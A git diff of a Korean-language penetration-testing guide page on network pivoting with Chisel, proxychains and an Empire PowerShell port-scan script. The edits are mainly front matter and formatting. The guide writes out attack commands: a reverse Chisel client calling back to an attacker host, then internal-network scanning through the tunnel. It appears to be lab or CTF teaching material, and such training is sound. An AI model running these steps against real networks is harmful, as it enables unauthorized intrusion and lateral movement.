@@ -1,3 +1,15 @@
+---
+layout: page
+title: Pivoting_Guide
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
+
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
+
 
 # 피버팅 및 터널링 가이드 (Chisel 활용)
 
@@ -18,14 +30,14 @@
 - **시나리오:** 공격자(Kali)가 인터넷에 노출된 웹 서버(Pivot)를 장악했고, 이 웹 서버를 통해 내부망(10.200.180.0/24)에 접근하고자 합니다.
 
 #### **1단계: 공격자 머신 - Chisel 서버 실행**
-```bash(title="공격자 Kali")
+```bash
 # --reverse: 클라이언트로부터의 리버스 연결을 허용
 ./chisel server -p 9001 --reverse
 ```
 
 #### **2단계: Pivot 장비 - Chisel 클라이언트 실행**
 - 먼저 `chisel` 바이너리를 Pivot 장비에 업로드해야 합니다.
-```bash(title="Pivot 장비")
+```bash
 # <attacker_ip>:9001: 공격자 Chisel 서버에 접속
 # R:socks: 원격(공격자) 측에 SOCKS 프록시를 생성하라는 의미. 
 #         (R은 Remote의 약자로, 클라이언트 입장에서의 Remote는 서버를 의미)
@@ -35,14 +47,14 @@
 
 #### **3단계: 공격자 머신 - Proxychains 설정**
 - `/etc/proxychains4.conf` 파일의 맨 아래에 Chisel이 생성한 SOCKS 프록시를 추가합니다.
-```ini(title="/etc/proxychains4.conf")
+```ini
 [ProxyList]
 socks5 127.0.0.1 1080
 ```
 
 #### **4단계: 내부망 정찰**
 - 이제 `proxychains`를 명령어 앞에 붙이면, 모든 트래픽이 터널을 통해 Pivot 장비를 거쳐 내부망으로 전달됩니다.
-```bash(title="공격자 Kali")
+```bash
 # Proxychains를 통해 내부망의 다른 호스트(10.200.180.150)를 스캔
 proxychains nmap -sT -Pn -p 22,80,445 10.200.180.150
 
@@ -84,10 +96,10 @@ proxychains curl http://10.200.180.150
 4.  **공격자 Proxychains 설정:**
     - `/etc/proxychains4.conf`에 모든 프록시를 순서대로 추가합니다.
     ```ini
-#[ProxyList]
-socks5 127.0.0.1 9999
-socks5 127.0.0.1 8888
-```
+    #[ProxyList]
+    socks5 127.0.0.1 9999
+    socks5 127.0.0.1 8888
+    ```
 
 ---
 
@@ -97,7 +109,7 @@ socks5 127.0.0.1 8888
 - **전략:** Pivot 장비 자체에서 PowerShell 스크립트를 이용해 내부망을 스캔합니다.
 - **[스크립트 링크](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1)**
 
-```powershell(title="PowerShell 포트 스캔")
+```powershell
 # 1. evil-winrm의 upload 기능을 이용해 Invoke-Portscan.ps1 스크립트 업로드
 
 # 2. 스크립트를 현재 세션으로 로드
